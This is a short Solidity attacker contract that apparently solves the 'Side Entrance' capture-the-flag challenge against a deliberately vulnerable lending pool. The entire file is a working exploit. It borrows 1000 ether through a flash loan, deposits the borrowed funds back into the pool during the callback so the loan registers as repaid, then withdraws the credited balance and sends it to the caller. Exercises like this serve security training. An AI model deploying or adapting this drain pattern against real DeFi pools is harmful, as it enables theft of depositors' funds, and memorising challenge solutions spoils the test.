// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge {
    
    function attack(address pool) external {
        uint256 amount = 1000 * (10 ** 18);
        SideEntranceLenderPool(pool).flashLoan(amount);
        SideEntranceLenderPool(pool).withdraw();
        payable(msg.sender).transfer(amount);
    }

    function execute() external payable {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    receive() external payable {}
}